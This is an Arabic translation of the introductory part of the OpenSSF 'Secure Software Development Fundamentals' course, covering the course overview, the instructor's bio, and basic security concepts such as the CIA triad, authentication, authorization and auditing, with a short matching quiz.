# أساسيات تطوير البرمجيات الآمنة
بواسطة ديفيد أ. ويلر
يشمَل هذا المحتوى ثلاث دورات ذاتية. يستطيع المستخدمين التعلم من خلاله مجانًا, أو التقدم بطلب للحصول على شهادة إتمام مقابل دفع رسوم.

لاتمام ** الدورة ، يرجى الانتقال إلى [صفحة الويب OpenSSF حول دورات أساسيات تطوير البرامج الآمنة](https://openssf.org/training/courses/).
بامكانك أيضا الذهاب مباشرة إلى
["تطوير البرمجيات الآمنة" (LFD121)](https://training.linuxfoundation.org/training/developing-secure-software-lfd121/)
على موقع Linux Foundation Training and Certification ، أو إلى
[صفحة edX](https://www.edx.org/professional-certificate/linuxfoundationx-secure-software-development-fundamentals).
للحصول على هذا المحتوى بتنسيق Markdown، انتقل إلى <https://github.com/ossf/secure-sw-dev-fundamentals>.
تنقسم هذه المادة إلى 3 دورات مصغرة (الجزء 1-3) من الممكن أن تستغرق ~ 14-18 ساعة في الاجمال:
1. تطوير البرمجيات الآمنة - الجزء الأول ، المتطلبات والتصميم وإعادة الاستخدام [يغطي الأساسيات والمتطلبات والتصميم وإعادة الاستخدام] - ~  دورة 2-4 ساعات فقط ، ~ 4-5 ساعات في الاجمال بما في ذلك الاختبارات واستكشاف الموارد / الروابط المقدمة
2. تطوير البرمجيات الآمنة - الجزء الثاني ، التنفيذ - ~ 4-6 ساعات فقط ، ~ 5-7 ساعات إجمالا
3. تطوير البرامج الآمنة - الجزء الثالث ، التحقق والمزيد من الموضوعات المتخصصة  - ~ [يغطي التحقق ونماذج التهديد والتشفير والموضوعات المتقدمة الأخرى] 3-5 ساعات دورة فقط ، ~ 5-6 ساعات في الاجمال

يتم إصدار هذه المواد التعليمية (بما في ذلك اختبارات القسم) بموجب ترخيص المشاع الإبداعي نسب المصنف (CC-BY) ، وتحديدا CC-BY-4.0. بعض الصور (على سبيل المثال ، من XKCD) لها تراخيص مختلفة ويتم الإشارة إليها على هذا النحو. نحن لا نصدر امتحانات الفصل / النهائي بهذه الطريقة ، لأن ذلك من شأنه أن يشجع على الغش. إذا انتهى بك الأمر في بعض الظروف إلى الوصول إلى تلك الاختبارات ، فلا تقوم باطلاقها ونشرها ، من فضلك!

يمكننا إصلاح الأخطاء الكبيرة بسرعة, لكننا نريد بخلاف ذلك تنفيذ التحديثات كل 1-1.5 سنة فقط حتى تبقى محتوياتها مستقرة نسبيًا. يمكنك اقتراح تغيير عبر [https://github.com/ossf/secure-sw-dev-fundamentals/issues](https://github.com/ossf/secure-sw-dev-fundamentals/issues). تمت مطابقة محتوى الدورة التدريبية مع المواد المنشورة على edX اعتبارا من 2020-12-03. قررت LF Training and Certification ، من التجربة ، أنه من الأكثر أمانا وموثوقية كتابة / تحرير المحتوى على بعض الأنظمة الأساسية الأخرى ثم تحويله إلى edX (أي ، بدلا من لا تكرر نفسك (DRY) ، من الآمن كتابة كل شيء مرتين (WET)) ، لذلك هذه هي العملية التي نستخدمها. تم تطوير المستند الأصلي باستخدام مستندات Google. الصيغ الأخرى هي ترجمة ، والتي قد تحتوي على أخطاء في الترجمة.
تم تصميم نهج التعلم لدعم العديد من المستخدمين (مع إمكانية 10-15 مليون) ، لذلك يجب أن تكون جميع المشاكل (بما في ذلك عمليات التحقق من المعرفة) مؤتمتة بالكامل. لا توجد خطط لاستخدام مناقشات أو أي شيء آخر يتطلب مدربين من البشر (لأن ذلك لا يتسع بشكل جيد). في معظم الحالات ، تكون عمليات التحقق من المعرفة عبارة عن 1-2 أسئلة متعددة الخيارات. سيكون لدى هذه الاسئلة بشكل عام *ترتيب* عشوائي  للإجابات ، ولكن ليس *قيمًا* عشوائية  للإجابة (لا يوجد برنامج نصي Python).

**إرشادات المساهمين**

تمت كتابة هذا المستند ليسهل فهمه من قبل جمهوره (في هذه الحالة ، مطوري البرامج). بشكل عام ، في هذا المستند:

* استخدم الانقباضات (إلا إذا كنت تريد تركيزا خاصا على شيء ما).
* استخدم الاقتباس المنطقي ، وليس الاقتباس المطبعي. تتضمن عروض الأسعار فقط ما يتم اقتباسه. للمزيد ، انظر [ ويكيبيديا: اقتباس منطقي على ويكيبيديا](https://en.wikipedia.org/wiki/Wikipedia:Logical_quotation_on_Wikipedia).
* استخدم الضمائر ، وخاصة *أنت*.
* استخدم فواصل أكسفورد.
* استشهد بالمصادر.

لمزيد من المعلومات ، راجع [5 قواعد نحوية غبية يجب ألا تتبعها أبدا لأنها تجعل كتابتك أسوأ](https://www.inc.com/minda-zetlin/5-stupid-grammar-rules-you-should-never-follow-because-they-make-your-writing-wo.html) و [6 خرافات نحوية: القواعد التي لا أبدا](https://wac.colostate.edu/docs/books/grammar/chapter6.pdf).

لاحظ أن edX يتطلب مجموعات على 3 مستويات: الأقسام والأقسام الفرعية والوحدات. يمكن أن تحتوي الوحدات (المستوى 3) فقط على محتوى.  نحن نمثل هذا في المواد أدناه على النحو التالي: يمثل "العنوان 1" بداية القسم ويحتوي فقط على تسلسلات تبدأ ب "العنوان 2" (بدون نص). يمثل "العنوان 2" بداية القسم الفرعي ويحتوي فقط على تسلسلات تبدأ ب "العنوان 3". يمثل "العنوان 3" بداية الوحدة ويحتوي على كل المحتوى. لا يمكن احتواء العنوان 3 مباشرة داخل العنوان 1. يتم استخدام العنوان 4 (وما دونه) بحرية داخل الوحدة. الاختبارات الفنية هي المستوى 3 في edX ، ولكن يتم تمثيلها على أنها المستوى 4 في تخفيض السعر لأن الاختبارات هي منطقيا جزء من القسم الذي يختبرونه.

المحتوى الأساسي القابل للتحرير بتنسيق تخفيض السعر. يجب ألا تكون هناك أخطاء markdownlint باستخدام التكوين الخاص بنا. يمكنك إضافة ارتباطات تشعبية إلى الأقسام الداخلية مثل #<i>section_name </i> حيث <i>section_name</i> هو العنوان الذي تم تحويله باستخدام خوارزمية GitHub [`gfm_auto_identifiers`](https://pandoc.org/MANUAL.html#extension-gfm_auto_identifiers) : تصبح المسافة  ، `-`وتصبح الأحرف الكبيرة (ASCII) صغيرة ، وتتم إزالة علامات الترقيم (بخلاف `-` و`_`).

**حول هذه الدورة (الجزء 1)**

تتعرض البرامج الحديثة لهجوم مستمر ، ولكن لم يتم إخبار العديد من مطوري البرامج بكيفية مواجهة هذه الهجمات بشكل فعال. تعمل هذه الدورة على حل هذه المشكلة ، من خلال شرح أساسيات تطوير البرامج الآمنة. موجهة نحو مطوري البرامج ومحترفي DevOps ومهندسي البرمجيات ومطوري تطبيقات الويب وغيرهم من المهتمين بتعلم كيفية تطوير برامج آمنة ، تركز هذه الدورة على الخطوات العملية التي يمكن اتخاذها ، حتى مع الموارد المحدودة ، لتحسين أمن المعلومات. ستمكن هذه الدورة مطوري البرامج من إنشاء وصيانة الأنظمة التي يصعب مهاجمتها بنجاح ، وتقليل الضرر عند نجاح الهجمات ، وتسريع الاستجابة بحيث يمكن إصلاح أي نقاط ضعف كامنة بسرعة.

يناقش هذا المساق أساسيات الأمن ، مثل ما تعنيه إدارة المخاطر حقًا. يناقش كيفية اعتبار الأمان جزءا من متطلبات النظام ، وما هي متطلبات الأمن المحتملة التي قد تأخذها بالحسبان. من بعدها يناقش هذا الجزء كيفية تصميم البرامج لتكون آمنة ، بما في ذلك مبادئ التصميم الامن المختلفة التي ستساعدك على تجنب التصميمات السيئة وتبني التصميمات الجيدة. كما يناقش كيفية تأمين سلسلة توريد البرامج الخاصة بك ، أي كيفية اختيار البرامج المعاد استخدامها والحصول عليها بشكل أكثر أمانًا (بما في ذلك البرامج مفتوحة المصدر) لتعزيز الأمن.

هذه هي الدورة الأولى من ثلاث دورات في برنامج الشهادة المهنية لأساسيات تطوير البرمجيات الآمنة ، وقد تم تطويرها من قبل مؤسسة أمان المصدر المفتوح (OpenSSF) ، وهو مشروع تابع لمؤسسة Linux يركز على تأمين النظام البيئي مفتوح المصدر. تركز الدورات التدريبية المضمنة في هذا البرنامج على الخطوات العملية التي يمكنك (كمطور) اتخاذها لمواجهة أكثر أنواع الهجمات شيوعًا.

**ما ستتعلمه (الجزء 1)**

<ul>
<li>أساسيات الأمان: إدارة المخاطر ، ثالوث "CIA" ، والمتطلبات.</li>
<li> مبادئ التصميم الآمن: ما هي مبادئ مثل "الاقل امتيازا" وكيفية تطبيق هذه المبادئ.</li>
<li> تقييم سلسلة التوريد: نصائح حول كيفية اختيار الحزم لإعادة استخدامها ، وكيفية إعادة استخدامها بحيث يمكن تنبيهك وتحديثك بسرعة.</li>
</ul>

**حول هذه الدورة (جزء 2)**

تتعرض البرامج الحديثة لهجوم مستمر ، ولكن لم يتم إخبار العديد من مطوري البرامج بكيفية مواجهة هذه الهجمات بشكل فعال. تعمل هذه الدورة على حل هذه المشكلة ، من خلال شرح أساسيات تطوير البرامج الآمنة. موجهة لمطوري البرامج ومحترفي DevOps ومهندسي البرمجيات ومطوري تطبيقات الويب وغيرهم من المهتمين بتعلم كيفية تطوير برامج آمنة ، تركز هذه الدورة على الخطوات العملية التي يمكن اتخاذها ، حتى مع توفر موارد محدودة لتحسين أمن المعلومات. ستمكن هذه الدورة مطوري البرامج من إنشاء وصيانة الأنظمة التي يصعب مهاجمتها بنجاح ، وتقليل الضرر عند نجاح الهجمات ، وتسريع الاستجابة بحيث يمكن إصلاح أي نقاط ضعف كامنة بسرعة.

تركز هذه الدورة على قضايا التنفيذ الرئيسية: التحقق من صحة المدخلات (مثل سبب استخدام القوائم المسموح بها وليس منكريها) ، ومعالجة البيانات بشكل آمن ، واستدعاء البرامج الأخرى ، وإرسال المخرجات ، ومعالجة الأخطاء. يركز على الخطوات العملية التي يمكنك (كمطور) اتخاذها لمواجهة أكثر أنواع الهجمات شيوعا.

هذه هي الدورة الثانية من ثلاث دورات في برنامج الشهادة المهنية لأساسيات تطوير البرمجيات الآمنة ، وقد تم تطويرها من قبل مؤسسة أمان المصدر المفتوح (OpenSSF) ، وهو مشروع تابع لمؤسسة Linux يركز على تأمين النظام البيئي مفتوح المصدر.

**ما ستتعلمه (الجزء 2)**

<ul>
<li>التنفيذ: ستتعلم كيفية تنفيذ برامج أكثر أمانا. يتضمن ذلك كيفية إجراء التحقق من صحة الإدخال ومعالجة البيانات بشكل آمن واستدعاء البرامج الأخرى وإرسال الإخراج. ستتعرف أيضا على المزيد من الأساليب المتخصصة ، بما في ذلك بعض أساسيات التشفير ومشاكل المعالجة (مثل رمز معالجة الأخطاء).</li>
</ul>

**حول هذه الدورة (الجزء 3)**

تتعرض البرامج الحديثة لهجوم مستمر ، ولكن لم يتم إخبار العديد من مطوري البرامج بكيفية مواجهة هذه الهجمات بشكل فعال. تعمل هذه الدورة على حل هذه المشكلة ، من خلال شرح أساسيات تطوير البرامج الآمنة. موجهة نحو مطوري البرامج ومحترفي DevOps ومهندسي البرمجيات ومطوري تطبيقات الويب وغيرهم من المهتمين بتعلم كيفية تطوير برامج آمنة ، تركز هذه الدورة على الخطوات العملية التي يمكن اتخاذها ، حتى مع وجود موارد محدودة لتحسين أمن المعلومات. ستمكن هذه الدورة مطوري البرامج من إنشاء وصيانة الأنظمة التي يصعب مهاجمتها بنجاح ، وتقليل الضرر عند نجاح الهجمات ، وتسريع الاستجابة بحيث يمكن إصلاح أي نقاط ضعف كامنة بسرعة.

يناقش هذا المقرر الدراسي كيفية التحقق من البرامج للأمان. على وجه الخصوص ، يناقش مختلف مناهج التحليلات الثابتة والديناميكية ، وكذلك كيفية تطبيقها (على سبيل المثال ، في خط أنابيب التكامل المستمر). كما يناقش موضوعات أكثر تخصصا ، مثل أساسيات كيفية تطوير نموذج التهديد وكيفية تطبيق قدرات التشفير المختلفة.

هذه هي الدورة الثالثة من ثلاث دورات في برنامج الشهادة الاحترافية لأساسيات تطوير البرمجيات الآمنة ، وقد تم تطويرها من قبل مؤسسة أمان المصدر المفتوح (OpenSSF) ، وهو مشروع تابع لمؤسسة Linux يركز على تأمين النظام البيئي مفتوح المصدر. تركز الدورات التدريبية المضمنة في هذا البرنامج على الخطوات العملية التي يمكنك (كمطور) اتخاذها لمواجهة أكثر أنواع الهجمات شيوعا.

**ما ستتعلمه (الجزء 3)**

<ul>
<li>التحقق الأمني: كيفية فحص البرامج ، وتضمين بعض أنواع الأدوات الرئيسية ، وكيفية تطبيقها في التكامل المستمر (CI). يتضمن ذلك التعرف على الماسحات الضوئية لرمز الأمان / أدوات اختبار أمان التطبيقات الثابتة (SAST) ، وأدوات تحليل تكوين البرامج (SCA) / تحليل التبعية ، و fuzzers ، وماسحات تطبيقات الويب.</li>
<li> نموذج التهديد / نموذج الهجوم: كيفية النظر في نظامك من وجهة نظر المهاجم وكيفية تطبيق نهج تحليل تصميم بسيط يسمى STRIDE.</li>
 <li>الميدان: كيفية نشر البرامج الآمنة وتشغيلها، والتعامل مع تقارير الثغرات الأمنية، وكيفية التحديث السريع عندما تحتوي المكونات المعاد استخدامها على ثغرات أمنية معروفة للجمهور.</li>
<li> حالات التأكيد والأساليب الرسمية: أساسيات الأساليب لتحليل وتبرير أن برنامجك آمن بشكل أقوى.</li>
</ul>
**تعرف على معلمك**
ديفيد أ. ويلر<br>
مدير أمن سلسلة التوريد مفتوحة المصدر في مؤسسة<br> لينكس
الدكتور ديفيد أ. ويلر هو خبير في تطوير البرمجيات الآمنة والبرمجيات مفتوحة المصدر (OSS). وهو مدير أمن سلسلة التوريد مفتوحة المصدر في مؤسسة Linux ويقوم بتدريس دورات الدراسات العليا في تطوير البرامج الآمنة في جامعة جورج ميسون (GMU) في فيرفاكس ، فيرجينيا. وهو حاصل على درجة الدكتوراه في تكنولوجيا المعلومات، ودرجة الماجستير في علوم الكمبيوتر، وشهادة في أمن المعلومات، وشهادة في هندسة البرمجيات، وبكالوريوس في هندسة الإلكترونيات. وهو أيضا محترف معتمد في أمن نظم المعلومات (CISSP) وعضو أقدم في IEEE. يقود مشروع شارة أفضل الممارسات لمؤسسة أمان المصدر المفتوح (OpenSSF) لمؤسسة Linux وعمل كمدقق رئيسي للشراكة الوطنية لضمان المعلومات (NIAP) للمعايير المشتركة (الأمنية). يعيش في شمال فيرجينيا.

# جدول المحتويات

[[جدول المحتويات]]

# الجزء الأول: المتطلبات والتصميم وإعادة الاستخدام

# مقدمة الدورة

## مقدمة

*تعرف على أساسيات الأمان التي تسمح لك بتطوير برامج مقواة ضد الهجمات ، وفهم كيف يمكنك تقليل الضرر وتسريع الاستجابة عند استغلال ثغرة أمنية.*

تتعرض البرامج الحديثة لهجوم مستمر ، ولكن لم يتم إخبار العديد من مطوري البرامج بكيفية مواجهة هذه الهجمات بشكل فعال. تعمل هذه الدورة على حل هذه المشكلة ، من خلال شرح أساسيات تطوير البرامج الآمنة. موجهة نحو مطوري البرامج ومحترفي DevOps ومهندسي البرمجيات ومطوري تطبيقات الويب وغيرهم من المهتمين بتعلم كيفية تطوير برامج آمنة ، تركز هذه الدورة على الخطوات العملية التي يمكن اتخاذها ، حتى مع الموارد المحدودة ، لتحسين أمن المعلومات. ستمكن هذه الدورة مطوري البرامج من إنشاء وصيانة الأنظمة التي يصعب مهاجمتها بنجاح ، وتقليل الضرر عند نجاح الهجمات ، وتسريع الاستجابة بحيث يمكن إصلاح أي نقاط ضعف كامنة بسرعة.

تناقش الدورة المخاطر والمتطلبات ومبادئ التصميم وتقييم التعليمات البرمجية (مثل الحزم) لإعادة استخدامها. ثم يركز على قضايا التنفيذ الرئيسية: التحقق من صحة المدخلات (مثل سبب استخدام القوائم المسموح بها وليس قوائم الرفض) ، ومعالجة البيانات بشكل آمن ، واستدعاء البرامج الأخرى ، وإرسال المخرجات ، والتشفير ، ومعالجة الأخطاء ، والاستجابة للحوادث. ويلي ذلك مناقشة حول أنواع مختلفة من مشاكل التحقق ، بما في ذلك الاختبارات ، اختبار الأمان واختبار الاختراق وأدوات الأمان. ونهايةً بمناقشة حول نشر ومعالجة تقارير الثغرات الأمنية.

 * تم تطوير دورة أساسيات تطوير البرمجيات الآمنة* من قبل مؤسسة أمان المصدر المفتوح (OpenSSF) ، وهو مشروع تابع لمؤسسة Linux يركز على تأمين النظام البيئي مفتوح المصدر. تركز الدورة على الخطوات العملية التي يمكنك (كمطور) اتخاذها لمواجهة أكثر أنواع الهجمات شيوعا.

## ملاحظة من المؤلف

نوجه شكرنا للعديد من الأشخاص الذين قدموا تعليقات ونصائح مفيدة. نشكر بشكل خاص بول إي بلاك (NIST) وستيف ليبنر (SAFECode)  ودان لورينك (Google) وشريف منصور (OWASP) ويانيك موي (AdaCore) وأشوين راماسوامي على توصياتهم المدروسة والمحددة.

## الحافز

### الدافع: لماذا من المهم تأمين البرامج؟

كل يوم هناك أخبار حول أنظمة الكمبيوتر التي يتم اختراقها ، غالبا عبر نقاط ضعف مختلفة في البرنامج. قد تقوم البرامج غير الآمنة بما يلي:

* الإفراج عن المعلومات الخاصة / السرية (ويعرف أيضا باسم *"فقدان السرية")*

* فقدان المعلومات أو إتلافها (ويعرف أيضا باسم "فقدان* النزاهة*")

* تفقد الخدمة (ويعرف أيضا باسم *"فقدان التوفر").*

لكن المشاكل لا تنتهي عند هذا الحد. أي من ما ذكر اعلاه يمكن أن يسبب خسائر *في العالم الحقيقي*. وبامكانها أن تكلف المال والوقت والثقة وحتى الأرواح.

ومع ذلك ، غالبا ما لا يتم إخبار المطورين بكيفية تطوير برامج آمنة. يجب أن *نتوقع* أن المطورين الذين لم يتم إخبارهم أبدًا بكيفية القيام بشيء ما فأنهم سيجدون صعوبة في القيام به.

تركز هذه الدورة على مساعدتك على فهم كيفية تطوير برامج آمنة بصور عملية. البرامج *الآمنة* تعني البرامج:

* التي تكون أصعب بكثير على المهاجمين لاستغلالها ،

* التي نحد من الضرر إذا كان الاستغلال ناجحًا ، و

* حيث يمكن إصلاح نقاط الضعف واستعادة الاستغلال جزئيا بسرعة نسبية.

### الدافع: لماذا تؤخذ هذه الدورة؟

ما يهمنا بشكل أساسي هو أن تتعلم كيفية تطوير برامج *آمنة*. فيما يلي بعض ميزات ومزايا هذه الدورة تحديدًا:

1. **الاختبارات**. نطرح أسئلة اختبار على طول الطريق للمساعدة في تعزيز المفاهيم. من السهل فك الارتباط بالكتب ومقاطع الفيديو التقليدية ، معتقدا أنك تفهم المفاهيم الأساسية حتى عندما لا تفعل ذلك. في المقابل ، تساعد الاختبارات في تعزيز المفاهيم الأساسية حتى تفهمها.

2. **مجانا**. إذا كنت تريد فقط أن تتعلم ، فهذا لا يكلف شيئا! كل ما تحتاجه هو اتصال بالإنترنت. كثير من الناس لديهم موارد محدودة ونريد التأكد من أن هذه المعلومات متاحة لهم.

3. **افتح المحتوى**. المواد الإعلامية الرئيسية ليست فقط "مجانية" بمعنى "بدون تكلفة" ولكن أيضا من حيث الحرية. على وجه الخصوص ، يتم إصدار المحتوى المعلوماتي بموجب [رخصة المشاع الإبداعي (CC-BY) الإصدار 4.0 ](https://creativecommons.org/licenses/by/4.0/)، بحيث يمكنك إعادة استخدامه بعدة طرق. نريدك ** أن تستخدم هذه المعلومات! هناك بعض الاستثناءات. نقتبس مواد أخرى (مثل من XKCD) التي تخضع لتراخيصها الخاصة.

4. **دليل على الانتهاء**. إذا كنت تريد إثبات أنك تعلمت المادة (بدلا من مجرد رؤية بعض النصوص) ، فهذا الامر متاح. سيطلب من المتعلمين الذين يتناولون الدورة التدريبية على منصة تدريب Linux Foundation اجتياز اختبار نهائي من أجل إكمال الدورة ؛ سيحصلون على شهادة إتمام وسيحصلون أيضا على شارة رقمية يمكن مشاركتها عبر وسائل التواصل الاجتماعي لعرض معارفهم. على edX ، دليل الإكمال هذا يتوفر بسعر رمزي من خلال التسجيل في مسار تم التحقق منه. قد يساعدك هذا حقا في توصيل ما تعرفه للعمال أو العملاء أو عمال محتملين. بالمقارنة ، فإن مجرد امتلاك كتاب لا يثبت أنك قرأته أو فهمته.

5. **المَنالية**. لقد عملنا على جعل هذه المعلومات متاحة ومنالة. نريد أن نتأكد من أن المكفوفين ، الذين يعانون من ضعف البصر ، وعمى الألوان ، وما إلى ذلك بانه يمكنهم التعلم من هذه المواد.

6. **ينطبق على البرمجيات مفتوحة المصدر (OSS).** فالعديد من المواد المتعلقة بالأمن لا تقضي وقتا طويلا في برمجيات المصدر المفتوح، أو يصعب تطبيقها عند تطوير برمجيات المصدر المفتوح. ومع ذلك، فإن برمجيات المصدر المفتوح هي مفتاح تطوير البرمجيات الحديثة. نقوم بتضمين معلومات خاصة لأولئك الذين يطورون و / أو يستخدمون برمجيات المصدر المفتوح.

7. **مستقلة عن حجم المنظمة**. لا نطلب منك أن تكون في مؤسسة تطوير برمجيات كبيرة أو صغيرة. تفترض بعض الدورات التدريبية أنك في مؤسسة كبيرة لتطوير البرمجيات.

8. **مستقلة عن لغة البرمجة**. يستخدم معظم مطوري البرامج لغات برمجة متعددة أو سيبدلون حياتهم المهنية. مع وضع ذلك في عين الاعتبار ، توفر هذه الدورة أساسا أساسيا في تطوير برامج آمنة تنطبق على *العديد من* لغات البرمجة. سنستخدم أمثلة من لغات برمجة محددة ، لكننا نريد أن يكون لديك أساس متين بغض النظر عن ما تستخدمه - الآن أو في المستقبل. يجب عليك استكمال هذه المعلومات بمواد للغة أو إطار العمل المحدد الذي تستخدمه ، ولكن هذه الدورة ستمنحك الاساسيات لفهم وتطبيق تلك المواد الأخرى.

9. **عملي**. تركز هذه الدورة على  النصائح *العملية* للأشخاص الذين يقومون بتطوير البرمجيات. على وجه الخصوص ، نوصي بأشياء محددة للقيام بها أو تجنبها ، وما إلى ذلك. يناقش بإيجاز سبب تطبيق هذه النصيحة ، لكن هذه ليست دورة دراسات عليا. نحن نركز أكثر على *ما* يجب القيام به بدلا من النظريات أو التفاصيل الفنية وراء ذلك.

هناك مواد أخرى يمكن أن توفر معلومات حول أمان البرامج. فيما يلي بعض البدائل الجديرة بالاهتمام والتباين معها:

1.  [* يركز كتاب هندسة الأمن*](https://www.cl.cam.ac.uk/~rja14/book.html) من تأليف روس أندرسون على الأنظمة ككل ، بما في ذلك الأجهزة والعمليات التجارية ، ويركز على مخاوف الصورة الكبيرة. ومع ذلك ، لا يغطي هذا الكتاب معظم تفاصيل كيفية تنفيذ البرامج الآمنة. في المقابل ، تهتم هذه الدورة (على عكس كتاب روس أندرسون) بتحديد ومناقشة كيفية مواجهة الأنواع الأكثر شيوعا من الثغرات الأمنية.

2. [مواد التدريب SAFECode](https://safecode.org/training/). لدى SAFECode عدد من المواد التدريبية المتاحة. بعض المواد جيدة جدا وهي مقاطع فيديو (في حين أن هذه الدورة عبارة عن نص في الغالب). لاحظ أن العديد من موادهم غالبا ما تكون مركزة بشكل ضيق. على سبيل المثال ، الدورة التدريبية الخاصة بهم * "البرمجة النصية عبر المواقع (XSS)* 101"  هي على نوع واحد شائع من الثغرات الأمنية ، و * "برمجة Java الآمنة 101"* تنطبق فقط على لغة واحدة. تحقق من التواريخ ، لأن بعض المواد قد تكون قديمة. ومع ذلك ، إذا كانت موادهم تتطابق مع ما تريد ، فهي بالتأكيد بدائل تستحق.

3. [إطار المعرفة الأمنية OWASP (OWASP-SKF).](https://www.securityknowledgeframework.org/) "OWASP-SKF هو تطبيق ويب مفتوح المصدر يشرح مبادئ الترميز الآمن بلغات برمجة متعددة. الهدف من OWASP-SKF هو مساعدتك على التعلم ودمج الأمان حسب التصميم في تطوير البرامج الخاصة بك وبناء تطبيقات آمنة حسب التصميم. يقوم OWASP-SKF بذلك من خلال مشاريع تطوير البرمجيات التي يمكن إدارتها مع قوائم المراجعة  (باستخدام OWASP-ASVS[/OWASP-MASVS ](https://owasp.org/www-project-application-security-verification-standard/) أو قوائم التحقق الأمنية المخصصة) والمختبرات لممارسة التحقق الأمني (باستخدام SKF-Labs [ و OWASP Juice-shop وأمثلة على كود أفضل الممارسات من SKF و ](https://owasp.org/www-project-mobile-security-testing-guide/)OWASP-Cheatsheets[](https://owasp.org/www-project-juice-shop/)[](https://cheatsheetseries.owasp.org)). في المقابل ، لا تتطلب هذه الدورة (على عكس OWASP-SKF) مشاريع تطوير البرمجيات والمختبرات.

اختر المواد التي ستزودك بالمعلومات التي تريد تعلمها ، ويمكنك بالتأكيد استخدامها جميعا إذا كنت ترغب في ذلك.

مع كل ما ذكر اعلا، فلنبدأ.

# أساسيات الأمان

يقدم هذا الفصل نظرة عامة عالية المستوى حول الأمان، بما في ذلك تعريفات الأمان والخصوصية والمتطلبات وإدارة المخاطر.

أهداف التعلم:

1. شرح ما يعنيه الأمان وفهم الأنواع الشائعة من متطلبات الأمان.

2. ناقش ماهية الخصوصية وأهميتها ومتطلبات الخصوصية.

3. مناقشة إدارة المخاطر.

4. مناقشة الدفاع في اتساع وكيفية تطبيق مفاهيم الأمان في عمليات تطوير البرمجيات المختلفة.

5. فهم أهمية *الحماية والكشف والاستجابة*.

6. شرح أساسيات التعامل مع نقاط الضعف.

## ماذا نحتاج؟

### ماذا يعني "الأمن"؟

للحصول على برنامج آمن ، نحتاج أولا إلى فهم معنى *الأمان* . البرامج المختلفة لها متطلبات أمان محددة مختلفة ، لكن العديد من الأشخاص يقسمون متطلبات الأمان إلى ثلاثة أهداف عامة - السرية والنزاهة والتوافر:

* **السرية**<br>"لا قراءة غير مصرح بها" - يسمح للمستخدمين فقط بقراءة المعلومات المصرح لهم بقراءتها.

* **النزاهة**<br>"لا يوجد تعديل غير مصرح به (كتابة أو حذف)" - يسمح للمستخدمين فقط بتعديل المعلومات المصرح لهم بتعديلها ؛ يتضمن التعديل الإضافات والتغييرات والحذف.

* **التوفر**<br>"يستمر في العمل في وجود هجوم." - يستمر البرنامج في العمل أثناء تعرضه للهجوم. هجوم رفض الخدمة (DoS) هو هجوم يحاول جعل البرنامج لم يعد متاحا.

تسمى هذه المجموعة من السرية والنزاهة والتوافر (CIA) أحيانا ثالوث CIA.

![ثالوث وكالة المخابرات المركزية](cia.png)

ثالوث وكالة المخابرات المركزية

ويضيف الكثيرون هدفا أمنيا آخر: **عدم التنصل** أو **المساءلة**. نقطة عدم التنصل أو المساءلة هي أنه إذا اتخذ شخص ما إجراءات معينة ، فيجب أن يكون النظام قادرا على إثبات ذلك لاحقا ، حتى لو أنكر الشخص المعني ذلك لاحقا. ومن الأمثلة على هذه الإجراءات تحويل مبلغ كبير من المال أو حذف شيء مهم أو إرسال رسالة مهمة أو تلقي رسالة مهمة. بعض الأنظمة لا تحتوي على مثل هذه المتطلبات ، وحتى عندما تفعل ذلك ، يعتبر بعض الناس هذه حالة خاصة من النزاهة. يضيف بعض الأشخاص أهدافا أخرى أيضا. بغض النظر عن كيفية تصنيف الأشياء ، من المهم أن تعرف بوضوح ما يفترض أن يفعله النظام. يمكن أن يساعدك وجود بعض الفئات البسيطة في القيام بذلك.

تحتاج هذه الأهداف الأمنية إلى بعض آليات الدعم. على سبيل المثال ، تتطلب السرية والنزاهة أن تكون هناك طريقة لتحديد ما إذا كان الإجراء مصرحا به (ما لم يتم التصريح بجميع الطلبات). فيما يلي بعض آليات الدعم الشائعة:

* **تحديد الهوية والمصادقة (I&A)**<br>مطالبة المستخدمين بتعريف أنفسهم وإثبات (مصادقة) هويتهم قبل القيام بأي شيء يتطلب تفويضا. على سبيل المثال ، قد يستخدمون اسم مستخدم أو عنوان بريد إلكتروني كهويتهم ، ويستخدمون كلمة مرور أو رمزا مميزا للأجهزة لمصادقة أنهم بالفعل هذا المستخدم. يتم ذلك عادة عن طريق عملية تسجيل الدخول.

* **التفويض**<br>حدد ما يسمح لهذا المستخدم (المصرح له) بالقيام به قبل اتخاذ قرار بالقيام بذلك. يمكنك التفكير في التفويض كقائمة بما يسمح لكل مستخدم بفعله. إذا كان من السهل على المهاجم إضافة تراخيص ، فإن تأمين I&A يعني القليل. هذا أمر بالغ الأهمية لتنفيذ السرية و / أو النزاهة. احترس: تبدو الكلمات المصادقة ** والتفويض ** متشابهة ، لكنهما ليسا نفس الشيء. قد تعرف بالضبط من هو شخص ما (المصادقة) ، ولكن لا تزال لا تسمح لهذا الشخص بفعل شيء ما (التفويض).

* **التدقيق** (المعروف أيضا باسم التسجيل)<br>سجل الأحداث المهمة للمساعدة في اكتشاف الهجمات والتعافي منها. عادة ما تتضمن هذه الأحداث تسجيل الدخول وتسجيل الخروج وتعديل المعلومات المهمة. غالبا ما يكون التدقيق أمرا بالغ الأهمية لتنفيذ متطلبات عدم التنصل / المساءلة.

يعتمد ما تفعله على وجه التحديد على البرنامج الذي تقوم بتطويره. إذا كنت تقوم بتطوير مكتبة ذات مستوى أدنى ، فقد لا تدعم بشكل مباشر أيا من آليات الدعم هذه ، ولكن لا يزال يتعين عليك التأكد من أن ما تفعله يتناسب مع برنامج أكبر.

#### اختبار 1.1: ماذا يعني "الأمان"؟

\>\>طابق المصطلحات مع التعريفات الصحيحة.<<

السرية : يجب أن يكون مصرحا بالقراءة

النزاهة: يجب التصريح بالتعديلات

التوفر : يستمر البرنامج في العمل حتى أثناء تعرضه للهجوم

الهوية والمصادقة (I&A): يجب على المستخدمين الإعلان عن هويتهم وإثبات ذلك

التفويض : تحديد ما يسمح للمستخدم بفعله

التدقيق : تسجيل الأحداث الهامة

### المتطلبات الأمنية

لإنشاء برنامج ، تحتاج إلى معرفة ما تريد القيام به. المتطلبات هي ببساطة ما يحتاج المنتج أو الخدمة إلى القيام به أو أن يكون. لأغراضنا ، قم بتضمين المتطلبات أي شيء يتطلبه القانون أو اللوائح ، بالإضافة إلى أي شيء مهم لعملائها / مستخدميها (المحتملين). إذا كنت تتقاضى أجرا لتطوير البرامج ، فعادة ما يتم تسجيل المتطلبات في مكان ما.

